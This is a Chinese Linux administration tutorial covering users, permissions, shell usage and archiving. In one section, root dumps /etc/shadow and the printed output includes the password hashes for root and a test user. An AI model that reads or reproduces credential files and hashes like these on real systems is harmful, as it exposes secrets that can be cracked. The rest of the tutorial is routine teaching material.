<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看用户详细信息</span></span><br><span class="line">lchage</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost ~]# lchage -l test1</span><br><span class="line">帐号没被锁。</span><br><span class="line">至少:	0</span><br><span class="line">至多:	99999</span><br><span class="line">警告:	7</span><br><span class="line">不活跃：	从不</span><br><span class="line">最后一次改变：	2021年07月20日</span><br><span class="line">密码过期：	从不</span><br><span class="line">密码不活跃：	从不</span><br><span class="line">帐号过期：	从不</span><br></pre></td></tr></table></figure>

<p>所有的用户信息存储在&#x2F;etc&#x2F;passwd文件中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">polkitd:x:999:998:User for polkitd:/:/sbin/nologin</span><br><span class="line">tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin</span><br><span class="line">abrt:x:173:173::/etc/abrt:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">chrony:x:998:996::/var/lib/chrony:/sbin/nologin</span><br><span class="line">test1:x:1000:1000::/home/test1:/bin/bash</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">passwd文件解释</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">test1:x:1000:1000::/home/test1:/bin/bash</span><br><span class="line">test2:x:1001:1001::/home/test2:/sbin/nologin</span><br><span class="line">test3:x:1002:1000::/home/test3:/sbin/nologin</span><br><span class="line">haha:x:1004:1004:putong user:/home/haha:/bin/bash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">LOGNAME : PASSWORD : UID : GID : USERINFO : HOME : SHELL</span></span><br><span class="line">第一列：用户名</span><br><span class="line">第二列：x</span><br><span class="line">第三列：uid;用户ID的范围是0~65535，其中0是超级用户root的标识号；1~99由系统保留，作为管理预设账号；100~499保留给一些服务使用；500~65535给一般用户使用。一般用户权限最低；</span><br><span class="line">第四列：gid</span><br><span class="line">第五列：注释，备注，一般为空</span><br><span class="line">第六列：家目录的位置</span><br><span class="line">第七列：使用shell的名称，默认使用/bin/bash</span><br></pre></td></tr></table></figure>



<p>所有的用户密码信息存储&#x2F;etc&#x2F;shadow</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cat /etc/shadow</span><br><span class="line">root:$6$QM3AHtFflOvGbCnt$2wTYZrnO8c66vycaxprE79G.I7hiy8EqXntG86FXxqlSawjtKoTjAnAa9xFA3ad1QpFskJRPt0QeDPBnZZAdx0::0:99999:7:::</span><br><span class="line">bin:*:18353:0:99999:7:::</span><br><span class="line">daemon:*:18353:0:99999:7:::</span><br><span class="line">adm:*:18353:0:99999:7:::</span><br><span class="line">lp:*:18353:0:99999:7:::</span><br><span class="line">sync:*:18353:0:99999:7:::</span><br><span class="line">shutdown:*:18353:0:99999:7:::</span><br><span class="line">halt:*:18353:0:99999:7:::</span><br><span class="line">mail:*:18353:0:99999:7:::</span><br><span class="line">operator:*:18353:0:99999:7:::</span><br><span class="line">games:*:18353:0:99999:7:::</span><br><span class="line">ftp:*:18353:0:99999:7:::</span><br><span class="line">nobody:*:18353:0:99999:7:::</span><br><span class="line">systemd-network:!!:18827::::::</span><br><span class="line">dbus:!!:18827::::::</span><br><span class="line">polkitd:!!:18827::::::</span><br><span class="line">tss:!!:18827::::::</span><br><span class="line">abrt:!!:18827::::::</span><br><span class="line">sshd:!!:18827::::::</span><br><span class="line">postfix:!!:18827::::::</span><br><span class="line">chrony:!!:18827::::::</span><br><span class="line">test1:$6$7PLnhlcr$4SCHINbWrameVSn6rxYgDOeUBwvYOHVbEOIudtNxWXIl5ULSt1Om8FvK6R3s9fI0qNef1vq8NhVMNJwudmfkM1:18828:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>用户组管理</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">增  groupadd</span><br><span class="line">删  groupdel</span><br><span class="line">改  groupmod </span><br><span class="line">查  看/etc/group</span><br></pre></td></tr></table></figure>

<p>命令26</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">增加一个用户组</span></span><br><span class="line">groupadd</span><br><span class="line">例子：</span><br><span class="line">groupadd test  #创建用户的时候可以制定组   useradd -g test test2</span><br></pre></td></tr></table></figure>

<p>命令27</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除一个用户组</span></span><br><span class="line">groupdel</span><br><span class="line">例子： groupdel test</span><br></pre></td></tr></table></figure>

<p>命令28</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改一个用户组</span></span><br><span class="line">groupmod</span><br><span class="line">例子1：groupmod -g 999 test #修改用户组的组id</span><br><span class="line">例子2：groupmod -n haha test #讲用户组test修改为新的组名haha</span><br></pre></td></tr></table></figure>



<h2 id="7-权限管理"><a href="#7-权限管理" class="headerlink" title="7.权限管理"></a>7.权限管理</h2><p>root用户权限最高</p>
<p>user普通用户</p>
<p>users用户组</p>
<p>文件权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">r 4 代表读权限 read</span><br><span class="line">w 2 代表写权限 write</span><br><span class="line">x 1 代表执行权限</span><br><span class="line">- 0 空权限位</span><br><span class="line"></span><br><span class="line">权限值表</span><br><span class="line">0 ---</span><br><span class="line">1 --x</span><br><span class="line">2 -w-</span><br><span class="line">3 -wx</span><br><span class="line">4 r--</span><br><span class="line">5 r-x</span><br><span class="line">6 rw-</span><br><span class="line">7 rwx</span><br><span class="line"></span><br><span class="line">rw-   r--    r-- </span><br><span class="line">user  group  other</span><br></pre></td></tr></table></figure>

<p>命令25</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">改变文件的权限</span></span><br><span class="line">chmod</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改权限之前</span></span><br><span class="line">[test1@localhost tmp]$ ls -l</span><br><span class="line">总用量 4</span><br><span class="line">-rw-rw----. 1 test1 test1 8 7月  20 17:20 test1.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改权限</span></span><br><span class="line">[test1@localhost tmp]$ chmod u+x test1.txt </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改权限之后</span></span><br><span class="line">[test1@localhost tmp]$ ls -l</span><br><span class="line">总用量 4</span><br><span class="line">-rwxrw----. 1 test1 test1 8 7月  20 17:20 test1.txt</span><br><span class="line"></span><br><span class="line">例子2：</span><br><span class="line">同时修改多个权限</span><br><span class="line">[test1@localhost tmp]$ chmod u-x,g-x,o+x test1.txt </span><br><span class="line">[test1@localhost tmp]$ ls -l</span><br><span class="line">总用量 4</span><br><span class="line">-rw-rw---x. 1 test1 test1 8 7月  20 17:20 test1.txt</span><br><span class="line"></span><br><span class="line">例子3：</span><br><span class="line">[test1@localhost tmp]$ chmod 777 test1.txt </span><br><span class="line">[test1@localhost tmp]$ ls -l</span><br><span class="line">总用量 4</span><br><span class="line">-rwxrwxrwx. 1 test1 test1 8 7月  20 17:20 test1.txt</span><br></pre></td></tr></table></figure>

<p>命令26</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改文件的所属</span></span><br><span class="line">chown</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost tmp]# chown test2:test2 ls</span><br><span class="line">[root@localhost tmp]# ls -l</span><br><span class="line">总用量 404</span><br><span class="line">-rwxr-xr-x. 1 test2 test2 159024 7月  20 17:43 grep</span><br><span class="line">-rwxr-xr-x. 1 test2 test2 117608 7月  20 17:38 ls</span><br><span class="line">-rwxr-xr-x. 1 test1 test1 130360 7月  20 17:43 mv</span><br><span class="line">-rw-rw-rw-. 1 test1 test1     14 7月  20 17:38 test1.txt</span><br><span class="line">[root@localhost tmp]# chown test1 ls</span><br><span class="line">[root@localhost tmp]# ls -l</span><br><span class="line">总用量 404</span><br><span class="line">-rwxr-xr-x. 1 test2 test2 159024 7月  20 17:43 grep</span><br><span class="line">-rwxr-xr-x. 1 test1 test2 117608 7月  20 17:38 ls</span><br><span class="line">-rwxr-xr-x. 1 test1 test1 130360 7月  20 17:43 mv</span><br><span class="line">-rw-rw-rw-. 1 test1 test1     14 7月  20 17:38 test1.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用uid和gid修改文件的所属用户和所属用户组  属主，属组</span></span><br><span class="line">例子2：</span><br><span class="line">[root@localhost tmp]# ls -l</span><br><span class="line">总用量 404</span><br><span class="line">-rwxr-xr-x. 1 test2 test2 159024 7月  20 17:43 grep</span><br><span class="line">-rwxr-xr-x. 1 test1 test2 117608 7月  20 17:38 ls</span><br><span class="line">-rwxr-xr-x. 1 test1 test1 130360 7月  20 17:43 mv</span><br><span class="line">-rw-rw-rw-. 1 test1 test1     14 7月  20 17:38 test1.txt</span><br><span class="line">[root@localhost tmp]# id test1</span><br><span class="line">uid=1000(test1) gid=1000(test1) 组=1000(test1)</span><br><span class="line">[root@localhost tmp]# id test2</span><br><span class="line">uid=1001(test2) gid=1001(test2) 组=1001(test2)</span><br><span class="line">[root@localhost tmp]# useradd  -g test1  test3</span><br><span class="line">[root@localhost tmp]# id test3</span><br><span class="line">uid=1002(test3) gid=1000(test1) 组=1000(test1)</span><br><span class="line">[root@localhost tmp]# chown 1001:1001 test1.txt </span><br><span class="line">[root@localhost tmp]# ls -l </span><br><span class="line">总用量 404</span><br><span class="line">-rwxr-xr-x. 1 test2 test2 159024 7月  20 17:43 grep</span><br><span class="line">-rwxr-xr-x. 1 test1 test2 117608 7月  20 17:38 ls</span><br><span class="line">-rwxr-xr-x. 1 test1 test1 130360 7月  20 17:43 mv</span><br><span class="line">-rw-rw-rw-. 1 test2 test2     14 7月  20 17:38 test1.txt</span><br></pre></td></tr></table></figure>

<p>文件属性</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">文件属性</span></span><br><span class="line">[root@localhost ~]# ls -l /tmp/123.txt</span><br><span class="line">-rw-r--r--. 1 root root 0 7月  20 23:17 /tmp/123.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一段的第一个字符，表示文件类型 -文件 d目录 l软链接 b块设备</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一段第2-4字符，表示该文件所属用户的权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一段第5-7字符，表示该文件所属用户组的权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一段第8-10字符，表示其他用户对该文件的权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一段的第11个字符，表示开启selinux的状态下创建的</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第二段的数字，表示该文件的硬链接数量</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第三段的字符串，表示该文件所属用户</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第四段的字符串，表示该文件所属用户组</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第五段的数字，表示该文件的大小</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第六段到倒数第二段，都是该文件的修改时间</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">最一段，该文件的名称</span></span><br></pre></td></tr></table></figure>

<p>linux一切皆文件的系统</p>
<h2 id="8-Linux-Shell"><a href="#8-Linux-Shell" class="headerlink" title="8.Linux Shell"></a>8.Linux Shell</h2><p>优化ssh登录速度</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改配置文件，先备份</span></span><br><span class="line">[root@localhost ~]# cp /etc/ssh/sshd_config /tmp/</span><br><span class="line">[root@localhost ~]# vi /etc/ssh/sshd_config </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">直接输入:79回车</span></span><br><span class="line">    79  GSSAPIAuthentication no</span><br><span class="line">    115 UseDNS no</span><br><span class="line">输入:wq保存退出</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启sshd服务</span></span><br><span class="line">[root@localhost ~]# systemctl restart sshd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果修改失败，还原配置文件</span></span><br><span class="line">[root@localhost ~]# cp  /tmp/sshd_config  /etc/ssh/sshd_config</span><br><span class="line">[root@localhost ~]# systemctl restart sshd</span><br></pre></td></tr></table></figure>

<p>shell提示符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">root用户提示符</span></span><br><span class="line">[root@localhost ~]# </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">普通用户test1的提示符</span></span><br><span class="line">[test1@localhost ~]$ </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">提示符格式定制</span></span><br><span class="line">原格式</span><br><span class="line">[root@test ~]# echo $PS1</span><br><span class="line">[\u@\h \W]\$   # \u是用户，\h是主机名，\W是相对路径 </span><br><span class="line">修改后</span><br><span class="line">[root@test ~]#cd /usr/local/bin/</span><br><span class="line">[root@test bin]#export  PS1=&#x27;[\u@\h \w]\$&#x27;</span><br><span class="line">[root@test /usr/local/bin]#</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">永久修改</span></span><br><span class="line">[root@test 10:23:39 /usr/local/bin]#cd</span><br><span class="line">[root@test 10:24:25 ~]#vi .bashrc </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">找个空白的地方，插入一行</span></span><br><span class="line">export  PS1=&#x27;[\u@\h \t \w]\$&#x27;</span><br></pre></td></tr></table></figure>

<p>linux路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">相对路径  不完整路径，  例子../bin  bin</span><br><span class="line">绝对路径  也叫完整路径，例子/usr/local/bin/</span><br></pre></td></tr></table></figure>

<p>命令hostname</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">临时修改主机名</span></span><br><span class="line">hostname</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost ~]# hostname test</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要重新登录生效</span></span><br></pre></td></tr></table></figure>

<p>命令hostnamectl</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看主机的信息</span></span><br><span class="line">[root@localhost ~]# hostnamectl </span><br><span class="line">   Static hostname: localhost.localdomain</span><br><span class="line">         Icon name: computer-vm</span><br><span class="line">           Chassis: vm</span><br><span class="line">        Machine ID: f8a89169114741a8ac6de82954c5fbcb</span><br><span class="line">           Boot ID: dcf65386ccda42e29699d56101af8cf1</span><br><span class="line">    Virtualization: vmware</span><br><span class="line">  Operating System: CentOS Linux 7 (Core)</span><br><span class="line">       CPE OS Name: cpe:/o:centos:centos:7</span><br><span class="line">            Kernel: Linux 3.10.0-1127.el7.x86_64</span><br><span class="line">      Architecture: x86-64</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">永久修改主机名</span></span><br><span class="line">[root@localhost ~]# hostnamectl set-hostname test</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要重新登录生效</span></span><br></pre></td></tr></table></figure>

<p>命令reboot</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启系统</span></span><br><span class="line">reboot</span><br><span class="line">例子1：</span><br><span class="line">[root@test ~]# reboot</span><br></pre></td></tr></table></figure>

<p>命令shutdown</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭或者重启linux</span></span><br><span class="line">shutdown</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">立即关机</span></span><br><span class="line">[root@localhost ~]# shutdown -h now</span><br><span class="line"></span><br><span class="line">例子2：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">5分钟之后关机，可以使用shutdown -c取消</span></span><br><span class="line">[root@localhost ~]# shutdown -h 5</span><br><span class="line"></span><br><span class="line">例子3：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">5分钟之后重启系统，可以使用shutdown -c取消</span></span><br><span class="line">[root@localhost ~]# shutdown -r 5</span><br></pre></td></tr></table></figure>

<p>shell基础语法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">命令   参数   目标</span><br><span class="line">ls   -a -l   /opt </span><br><span class="line">rm   -rf    /opt/test1</span><br><span class="line"></span><br><span class="line">命令   目标1...   目标2</span><br><span class="line">mv    源路径     目标路径</span><br><span class="line">cp    </span><br><span class="line"></span><br><span class="line">命令</span><br><span class="line">reboot</span><br><span class="line"></span><br><span class="line">[root@test 11:12:02 /opt]#mv --help</span><br><span class="line">用法：mv [选项]... [-T] 源文件 目标文件</span><br><span class="line">　或：mv [选项]... 源文件... 目录</span><br><span class="line">　或：mv [选项]... -t 目录 源文件...</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式解释</span></span><br><span class="line">[选项] 可选的</span><br><span class="line">...    可以有多个</span><br></pre></td></tr></table></figure>

<p>tab键补全</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">补全命令</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果预选的特别多</span></span><br><span class="line">[root@test 11:25:24 ~]#</span><br><span class="line">Display all 1400 possibilities? (y or n)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果预选少</span></span><br><span class="line">[root@test 11:25:24 ~]#cha</span><br><span class="line">chacl   chage   chattr </span><br><span class="line"></span><br><span class="line">补全路径</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果预选的特别多</span></span><br><span class="line">[root@test 11:25:24 ~]#cd /etc/</span><br><span class="line">Display all 188 possibilities? (y or n)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果预选少</span></span><br><span class="line">[root@test 11:25:24 ~]#cd /usr/src/</span><br><span class="line">debug/   kernels/ </span><br></pre></td></tr></table></figure>

<p>快捷键</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Ctrl + a    #光标跳转至正在输入的命令行的首部</span><br><span class="line">Ctrl + e    #光标跳转至正在输入的命令行的尾部</span><br><span class="line">Ctrl + c    #终止前台运行的程序</span><br><span class="line">Ctrl + d    #在shell中，ctrl-d表示推出当前shell。</span><br><span class="line">Ctrl + z    #将任务暂停，挂至后台, 执行fg命令继续运行</span><br><span class="line">Ctrl + l    #清屏，和clear命令等效。</span><br><span class="line">Ctrl + k    #删除从光标到行末的所有字符</span><br><span class="line">Ctrl + u    #删除从光标到行首的所有字符</span><br><span class="line">Ctrl + r    #搜索历史命令, 利用关键字</span><br><span class="line">ctrl + w    #光标往前删除一个参数</span><br><span class="line">esc + .     #上一条命令的最后一个参数，或者目标</span><br></pre></td></tr></table></figure>

<p>history历史命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">历史</span></span><br><span class="line">history</span><br><span class="line">例子1:</span><br><span class="line">[root@test 14:32:10 ~]#history</span><br><span class="line">    1  exit</span><br><span class="line">    2  ls</span><br><span class="line">    3  head -1 test03.txt </span><br><span class="line">    4  head -1 test03.txt|cat</span><br><span class="line">    5  head -1 test03.txt|tac</span><br><span class="line">    6  head -2 test03.txt|tac</span><br><span class="line">    7  head -2 test03.txt|cat</span><br><span class="line">    8  ip addr</span><br><span class="line">    9  ip addr|tail -4</span><br><span class="line">   10  ip addr|tail -4|head -1</span><br><span class="line">   ......</span><br><span class="line"></span><br><span class="line">例子2：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用!调用历史命令</span></span><br><span class="line">[root@test 14:32:10 ~]#history|head -5</span><br><span class="line">    1  exit</span><br><span class="line">    2  ls</span><br><span class="line">    3  head -1 test03.txt </span><br><span class="line">    4  head -1 test03.txt|cat</span><br><span class="line">    5  head -1 test03.txt|tac</span><br><span class="line">[root@test 14:32:26 ~]# !3</span><br><span class="line"> head -1 test03.txt </span><br><span class="line">head: 无法打开&quot;test03.txt&quot; 读取数据: 没有那个文件或目录</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用!调用<span class="built_in">mv</span>开头的命令</span></span><br><span class="line">[root@test 14:42:17 ~]#history </span><br><span class="line">    1  ls -a -l .bash_history </span><br><span class="line">    2  history </span><br><span class="line">    3  ls</span><br><span class="line">    4  history </span><br><span class="line">    5  mv aaaaa.txt /tmp/</span><br><span class="line">    6  history </span><br><span class="line">[root@test 14:42:19 ~]#!mv</span><br><span class="line">mv aaaaa.txt /tmp/</span><br><span class="line">mv: 无法获取&quot;aaaaa.txt&quot; 的文件状态(stat): 没有那个文件或目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例子4：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">清除历史记录</span></span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>

<p>历史记录保存在家目录下的.bash_history文件中</p>
<p>命令别名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">别名</span></span><br><span class="line">alias</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看别名</span></span><br><span class="line">[root@test 15:23:17 ~]#alias </span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias egrep=&#x27;egrep --color=auto&#x27;</span><br><span class="line">alias fgrep=&#x27;fgrep --color=auto&#x27;</span><br><span class="line">alias grep=&#x27;grep --color=auto&#x27;</span><br><span class="line">alias l.=&#x27;ls -d .* --color=auto&#x27;</span><br><span class="line">alias ll=&#x27;ls -l --color=auto&#x27;</span><br><span class="line">alias ls=&#x27;ls --color=auto&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias which=&#x27;alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde&#x27;</span><br><span class="line"></span><br><span class="line">例子2：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加别名</span></span><br><span class="line">[test1@test 15:24:23 ~]$alias rm=&#x27;rm -i&#x27;</span><br><span class="line">[test1@test 15:27:08 ~]$alias |grep rm</span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line"></span><br><span class="line">例子3：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">取消别名</span></span><br><span class="line">[test1@test 15:27:13 ~]$unalias rm </span><br><span class="line">[test1@test 15:27:47 ~]$alias |grep rm</span><br><span class="line"></span><br><span class="line">例子4：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">alias</span>永久生效</span></span><br><span class="line">[root@localhost ~]# vi .bashrc </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">空白处，增加一行</span></span><br><span class="line">alias rm=&#x27;echo -bash: rm: 未找到命令&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="9-linux输入输出"><a href="#9-linux输入输出" class="headerlink" title="9.linux输入输出"></a>9.linux输入输出</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"> 重定向， 将命令执行结果不输出到屏幕上，输出到文件里，会清空原文件</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt; 追加重定向，不会清空原文件</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输入</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">标准输入0</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">标准正确输出1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">标准错误输出2</span></span><br></pre></td></tr></table></figure>

<h2 id="10-linux压缩打包"><a href="#10-linux压缩打包" class="headerlink" title="10.linux压缩打包"></a>10.linux压缩打包</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">打包和解压缩</span></span><br><span class="line">tar</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">归档，不压缩</span></span><br><span class="line">tar cf test.tar vmlinuz-*</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">例子2：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">压缩并归档</span></span><br><span class="line">tar zcf test2.tar.gz vmlinuz-*</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">例子3：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看压缩包内容</span></span><br><span class="line">[root@localhost ~]# tar tf test.tar </span><br><span class="line">vmlinuz-0-rescue-f8a89169114741a8ac6de82954c5fbcb</span><br><span class="line">vmlinuz-3.10.0-1127.el7.x86_64	</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">例子4：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压缩</span></span><br><span class="line">tar xf test.tar</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">打包和压缩</span></span><br><span class="line">gzip</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">压缩单个文件</span></span><br><span class="line">gzip protocols</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">压缩多个文件，每一个文件产生一个单独的压缩包</span></span><br><span class="line">gzip  hosts passwd shadow</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压缩</span></span><br><span class="line">gzip -d hosts.gz passwd.gz protocols.gz shadow.gz </span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">压缩</span></span><br><span class="line">zip</span><br><span class="line">例子1：</span><br><span class="line">zip -r 123.zip day01</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压</span></span><br><span class="line">unzip</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost file]# unzip 123.zip</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压rar包</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要安装软件</span></span><br><span class="line">yum install epel-release -y</span><br><span class="line">yum install unar -y</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">再进行解压</span></span><br><span class="line">unar -o /opt 456.rar</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载文件</span></span><br><span class="line">curl</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载文件</span></span><br><span class="line">curl -o 123.zip http://192.168.18.10/day01.zip</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查网络畅通</span></span><br><span class="line">ping</span><br><span class="line">例子1：ping 223.5.5.5</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果网不通，重启网络服务</span></span><br><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>

<p>查看文件类型file</p>
